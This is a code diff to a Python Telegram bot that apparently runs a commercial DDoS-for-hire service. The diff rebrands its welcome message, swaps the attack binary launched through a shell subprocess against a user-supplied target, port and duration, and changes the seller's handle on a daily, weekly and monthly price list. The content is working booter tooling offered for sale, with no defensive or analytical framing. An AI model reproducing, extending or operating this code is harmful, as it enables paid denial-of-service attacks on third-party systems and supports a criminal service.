@@ -112,7 +112,7 @@ def clear_logs():
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     welcome_message = (
-        "🔰 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗗𝗘𝗦𝗜 𝗛𝗔𝗖𝗞 𝗗𝗗𝗢𝗦 𝗕𝗢𝗧 🔰\n\n" )
+        "🔰 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗛𝗔𝗖𝗞 𝗗𝗗𝗢𝗦 𝗕𝗢𝗧 🔰\n\n" )
 
     markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
     btn_attack = types.KeyboardButton('🚀 Attack')
@@ -239,7 +239,7 @@ def start_attack(user_id, target, port, duration):
     response = f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration}\n𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿 𝗡𝗮𝗺𝗲: {username}"
     bot.send_message(user_id, response)
     try:
-        ongoing_attacks[attack_id] = subprocess.Popen(f"./DESI {target} {port} {duration}", shell=True)
+        ongoing_attacks[attack_id] = subprocess.Popen(f"./nand {target} {port} {duration}", shell=True)
         time.sleep(5)
       # Set cooldown for normal users after a successful attack
         if user_id not in ADMIN_IDS:
@@ -300,7 +300,7 @@ def handle_my_info_button(message):
 
 @bot.message_handler(func=lambda message: message.text == '💰 Buy Access!')
 def handle_buy_access_button(message):
-    response = (f"🔆 DESIHACK 𝐇𝐔𝐁 𝐃𝐃𝐎𝐒 𝐏𝐑𝐈𝐂𝐄 𝐋𝐈𝐒𝐓 🔆\n\n𝖣𝖠𝖸 - 150/-𝖨𝖭𝖱\n𝖶𝖤𝖤𝖪 - 600/-𝖨𝖭𝖱\n𝖬𝖮𝖭𝖳𝖧 - 1200/-𝖨𝖭𝖱\n\nDM TO BUY @LION_DEEPAK")
+    response = (f"🔆 𝐃𝐃𝐎𝐒 𝐏𝐑𝐈𝐂𝐄 𝐋𝐈𝐒𝐓 🔆\n\n𝖣𝖠𝖸 - 150/-𝖨𝖭𝖱\n𝖶𝖤𝖤𝖪 - 600/-𝖨𝖭𝖱\n𝖬𝖮𝖭𝖳𝖧 - 1200/-𝖨𝖭𝖱\n\nDM TO BUY @veinxd")
     bot.send_message(message.chat.id, response)
 
 
